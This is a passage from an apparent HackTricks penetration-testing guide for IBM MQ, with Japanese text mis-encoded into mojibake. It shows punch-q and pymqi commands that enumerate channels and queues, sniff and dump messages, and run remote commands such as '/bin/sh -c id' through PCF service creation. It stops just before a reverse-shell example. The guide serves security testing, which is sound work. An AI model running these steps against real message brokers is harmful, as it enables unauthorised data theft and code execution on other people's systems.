# 1414 - IBM MQã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricks repo](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## åŸºæœ¬æƒ…å ±

IBM MQã¯ã€ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚­ãƒ¥ãƒ¼ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®IBMã®æŠ€è¡“ã§ã™ã€‚ä»–ã®**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãƒ–ãƒ­ãƒ¼ã‚«ãƒ¼**æŠ€è¡“ã¨åŒæ§˜ã«ã€ãƒ—ãƒ­ãƒ‡ãƒ¥ãƒ¼ã‚µãƒ¼ã¨ã‚³ãƒ³ã‚·ãƒ¥ãƒ¼ãƒãƒ¼ã®é–“ã§æƒ…å ±ã‚’å—ä¿¡ã€ä¿å­˜ã€å‡¦ç†ã€åˆ†é¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€**IBM MQã¯TCPãƒãƒ¼ãƒˆ1414ã‚’å…¬é–‹**ã—ã¦ã„ã¾ã™ã€‚
æ™‚ã«ã¯ã€HTTP REST APIãŒãƒãƒ¼ãƒˆ**9443**ã§å…¬é–‹ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚
ãƒ¡ãƒˆãƒªã‚¯ã‚¹ï¼ˆPrometheusï¼‰ã¯TCPãƒãƒ¼ãƒˆ**9157**ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚

IBMã¯ã€[https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq)ã§åˆ©ç”¨å¯èƒ½ãªå¤§é‡ã®æŠ€è¡“ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚

## ãƒ„ãƒ¼ãƒ«

ç°¡å˜ãªæ”»æ’ƒã«ã¯ã€**[punch-q](https://github.com/sensepost/punch-q)**ã¨ã„ã†ãƒ„ãƒ¼ãƒ«ãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ã€‚Dockerã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€Pythonãƒ©ã‚¤ãƒ–ãƒ©ãƒª`pymqi`ã‚’ç©æ¥µçš„ã«ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚

ã‚ˆã‚Šæ‰‹å‹•çš„ãªã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’ã™ã‚‹å ´åˆã¯ã€Pythonãƒ©ã‚¤ãƒ–ãƒ©ãƒª**[pymqi](https://github.com/dsuch/pymqi)**ã‚’ä½¿ç”¨ã—ã¦ãã ã•ã„ã€‚[IBM MQã®ä¾å­˜é–¢ä¿‚](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ãŒå¿…è¦ã§ã™ã€‚

### pymqiã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«

**IBM MQã®ä¾å­˜é–¢ä¿‚**ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ãƒ­ãƒ¼ãƒ‰ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

1. [https://login.ibm.com/](https://login.ibm.com/)ã§ã‚¢ã‚«ã‚¦ãƒ³ãƒˆï¼ˆIBMidï¼‰ã‚’ä½œæˆã—ã¾ã™ã€‚
2. [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ã‹ã‚‰IBM MQãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚Linux x86_64ã®å ´åˆã¯**9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ã§ã™ã€‚
3. è§£å‡ã—ã¾ã™ï¼ˆ`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`ï¼‰ã€‚
4. `sudo ./mqlicense.sh`ã‚’å®Ÿè¡Œã—ã¦ãƒ©ã‚¤ã‚»ãƒ³ã‚¹æ¡ä»¶ã«åŒæ„ã—ã¾ã™ã€‚

> Kali Linuxã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«`mqlicense.sh`ã‚’å¤‰æ›´ã—ã¾ã™ã€‚æ¬¡ã®è¡Œï¼ˆ105-110è¡Œç›®ï¼‰ã‚’å‰Šé™¤/ã‚³ãƒ¡ãƒ³ãƒˆã‚¢ã‚¦ãƒˆã—ã¾ã™ã€‚
>
> ```bash
> if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>   then
>     echo "ERROR: This package is incompatible with this system"
>     echo "       This package was built for ${BUILD_PLATFORM}"
>     exit 1
> fi
> ```

5. ã“ã‚Œã‚‰ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ï¼š
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. æ¬¡ã«ã€ä¸€æ™‚çš„ã«`.so`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’LDã«è¿½åŠ ã—ã¾ã™ï¼š`export LD_LIBRARY_PATH=/opt/mqm/lib64`ã€‚ä»–ã®ä¾å­˜é–¢ä¿‚ã‚’ä½¿ç”¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã‚’å®Ÿè¡Œã™ã‚‹**å‰ã«**ã“ã‚Œã‚’è¡Œã£ã¦ãã ã•ã„ã€‚

æ¬¡ã«ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ[**pymqi**](https://github.com/dsuch/pymqi)ã‚’ã‚¯ãƒ­ãƒ¼ãƒ³ã—ã¾ã™ã€‚ã“ã‚Œã«ã¯èˆˆå‘³æ·±ã„ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚„å®šæ•°ãªã©ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã¾ãŸã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§ç›´æ¥ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š`pip install pymqi`ã€‚

### punch-qã®ä½¿ç”¨

#### Dockerã‚’ä½¿ç”¨ã™ã‚‹å ´åˆ

å˜ç´”ã«æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š`sudo docker run --rm -ti leonjza/punch-q`ã€‚

#### Dockerã‚’ä½¿ç”¨ã—ãªã„å ´åˆ

ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆ[**punch-q**](https://github.com/sensepost/punch-q)ã‚’ã‚¯ãƒ­ãƒ¼ãƒ³ã—ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã®ãŸã‚ã«readmeã«å¾“ã£ã¦ãã ã•ã„ï¼ˆ`pip install -r requirements.txt && python3 setup.py install`ï¼‰ã€‚

ãã®å¾Œã€`punch-q`ã‚³ãƒãƒ³ãƒ‰ã§ä½¿ç”¨ã§ãã¾ã™ã€‚

## åˆ—æŒ™

**punch-q**ã¾ãŸã¯**pymqi**ã‚’ä½¿ç”¨ã—ã¦ã€**ã‚­ãƒ¥ãƒ¼ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼åã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ãƒãƒ£ãƒãƒ«ã€ã‚­ãƒ¥ãƒ¼**ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚­ãƒ¥ãƒ¼ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼

ã‚­ãƒ¥ãƒ¼ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼åã‚’å–å¾—ã™ã‚‹ãŸã‚ã®ä¿è­·ãŒãªã„å ´åˆãŒã‚ã‚Šã¾ã™ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### ãƒãƒ£ãƒãƒ«

**punch-q**ã¯ã€æ—¢å­˜ã®ãƒãƒ£ãƒãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«å†…éƒ¨ï¼ˆå¤‰æ›´å¯èƒ½ãªï¼‰ãƒ¯ãƒ¼ãƒ‰ãƒªã‚¹ãƒˆã‚’ä½¿ç”¨ã—ã¦ã„ã¾ã™ã€‚ä½¿ç”¨ä¾‹ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
ã„ãã¤ã‹ã®IBM MQã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã¯ã€**èªè¨¼ã•ã‚Œã¦ã„ãªã„**MQãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å—ã‘ä»˜ã‘ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã®ã§ã€`--username / --password`ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚‚ã¡ã‚ã‚“ã€ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚‚ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

ä¸€åº¦ãƒãƒ£ãƒãƒ«åï¼ˆã“ã“ã§ã¯`DEV.ADMIN.SVRCONN`ï¼‰ã‚’å–å¾—ã™ã‚‹ã¨ã€ä»–ã®ã™ã¹ã¦ã®ãƒãƒ£ãƒãƒ«ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

åˆ—æŒ™ã¯ã€åŸºæœ¬çš„ã«ã¯**pymqi**ã®`code/examples/dis_channels.py`ã¨ã„ã†ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
...ã—ã‹ã—ã€**punch-q**ã‚‚ãã®éƒ¨åˆ†ã‚’åŸ‹ã‚è¾¼ã‚“ã§ã„ã¾ã™ï¼ˆã•ã‚‰ã«è©³ç´°ãªæƒ…å ±ã‚‚å«ã¾ã‚Œã¦ã„ã¾ã™ï¼ï¼‰ã€‚
æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§å®Ÿè¡Œã§ãã¾ã™ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### ã‚­ãƒ¥ãƒ¼

**pymqi** (`dis_queues.py`) ã«ã¯ã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆãŒã‚ã‚Šã¾ã™ãŒã€**punch-q** ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã‚­ãƒ¥ãƒ¼ã«é–¢ã™ã‚‹ã•ã‚‰ãªã‚‹æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®ãƒ€ãƒ³ãƒ—

ã‚­ãƒ¥ãƒ¼/ãƒãƒ£ãƒãƒ«ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¦ã€ãã“ã‹ã‚‰ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°/ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆç ´å£Šçš„ãªæ“ä½œã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚*ä¾‹:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ã™ã¹ã¦ã®ç‰¹å®šã®ã‚­ãƒ¥ãƒ¼ã«å¯¾ã—ã¦ç¹°ã‚Šè¿”ã—å‡¦ç†ã‚’èºŠèº‡ã—ãªã„ã§ãã ã•ã„ã€‚**

### ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œ

> ç¶šã‘ã‚‹å‰ã«ã„ãã¤ã‹ã®è©³ç´°ã‚’èª¬æ˜ã—ã¾ã™: IBM MQã¯è¤‡æ•°ã®æ–¹æ³•ã§åˆ¶å¾¡ã§ãã¾ã™: MQSCã€PCFã€Control Commandã€‚ä¸€èˆ¬çš„ãªãƒªã‚¹ãƒˆã¯[IBM MQãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***Programmable Command Formats***)ã¯ã€ãƒªãƒ¢ãƒ¼ãƒˆã§ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¨å¯¾è©±ã™ã‚‹ãŸã‚ã«ç„¦ç‚¹ã‚’å½“ã¦ã¦ã„ã‚‹ã‚‚ã®ã§ã™ã€‚**punch-q**ã¨ã•ã‚‰ã«**pymqi**ã¯ã€PCFã®ç›¸äº’ä½œç”¨ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚
>
> PCFã‚³ãƒãƒ³ãƒ‰ã®ãƒªã‚¹ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™:
> * [PCFãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats)ã€ãŠã‚ˆã³
> * [å®šæ•°ã‹ã‚‰](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes)ã€‚
>
> 1ã¤ã®èˆˆå‘³æ·±ã„ã‚³ãƒãƒ³ãƒ‰ã¯`MQCMD_CREATE_SERVICE`ã§ã€ãã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯[ã“ã¡ã‚‰](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms)ã§åˆ©ç”¨ã§ãã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ä¸Šã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’æŒ‡ã™`StartCommand`ã‚’å¼•æ•°ã¨ã—ã¦å–ã‚Šã¾ã™ï¼ˆä¾‹ï¼š`/bin/sh`ï¼‰ã€‚
>
> ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã¯ã€ã“ã®ã‚³ãƒãƒ³ãƒ‰ã®è­¦å‘Šã‚‚ã‚ã‚Šã¾ã™: *"æ³¨æ„: ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯mqmæ¨©é™ã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹æ¨©é™ãŒä¸ãˆã‚‰ã‚ŒãŸå ´åˆã€æ‚ªæ„ã®ã‚ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„æ³¨æ„ã‚’æ¬ ã„ãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã‚„ãƒ‡ãƒ¼ã‚¿ã‚’ç ´æã™ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€é‡è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚"*
>
> *æ³¨: IBM MQãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆï¼ˆç®¡ç†ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ï¼‰ã«ã‚ˆã‚Œã°ã€ã‚µãƒ¼ãƒ“ã‚¹ã®ä½œæˆï¼ˆ`DEFINE SERVICE`ï¼‰ã®ãŸã‚ã®åŒç­‰ã®MQSCã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®HTTPã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ`/admin/action/qmgr/{qmgrName}/mqsc`ã‚‚å­˜åœ¨ã—ã¾ã™ã€‚ã“ã®å´é¢ã¯ã¾ã ã“ã“ã§ã¯ã‚«ãƒãƒ¼ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚*

ãƒªãƒ¢ãƒ¼ãƒˆãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã®ãŸã‚ã®PCFã«ã‚ˆã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã®ä½œæˆ/å‰Šé™¤ã¯ã€**punch-q**ã«ã‚ˆã£ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™:

**ä¾‹1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> IBM MQã®ãƒ­ã‚°ã«ã¯ã€ã‚³ãƒãƒ³ãƒ‰ãŒæ­£å¸¸ã«å®Ÿè¡Œã•ã‚ŒãŸã“ã¨ãŒè¨˜éŒ²ã•ã‚Œã¦ã„ã¾ã™ï¼š
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: ã‚³ãƒãƒ³ãƒ‰ '808544aa7fc94c48' ãŒé–‹å§‹ã•ã‚Œã¾ã—ãŸã€‚ãƒ—ãƒ­ã‚»ã‚¹ID(618)ã€‚[ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

ã¾ãŸã€ãƒã‚·ãƒ³ä¸Šã®æ—¢å­˜ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼ˆã“ã“ã§ã¯ `/bin/doesnotexist` ... å­˜åœ¨ã—ã¾ã›ã‚“ï¼‰ï¼š
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®èµ·å‹•ãŒéåŒæœŸã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æ´»ç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€2ç•ªç›®ã®ã‚¢ã‚¤ãƒ†ãƒ ãŒå¿…è¦ã§ã™** ***(ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ãƒªã‚¹ãƒŠãƒ¼ã€ç•°ãªã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã§ã®ãƒ•ã‚¡ã‚¤ãƒ«ä½œæˆã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ãŸãƒ‡ãƒ¼ã‚¿ã®å¤–éƒ¨æµå‡ºãªã©)***

**ä¾‹2**

ç°¡å˜ãªãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ãŸã‚ã«ã€**punch-q**ã¯2ã¤ã®ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚‚æä¾›ã—ã¦ã„ã¾ã™ï¼š

* bashã‚’ä½¿ç”¨ã—ãŸã‚‚ã®
* perlã‚’ä½¿ç”¨ã—ãŸã‚‚ã®

*ã‚‚ã¡ã‚ã‚“ã€`execute`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã‚«ã‚¹ã‚¿ãƒ ã®ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚*

bashã®å ´åˆï¼š
```bash
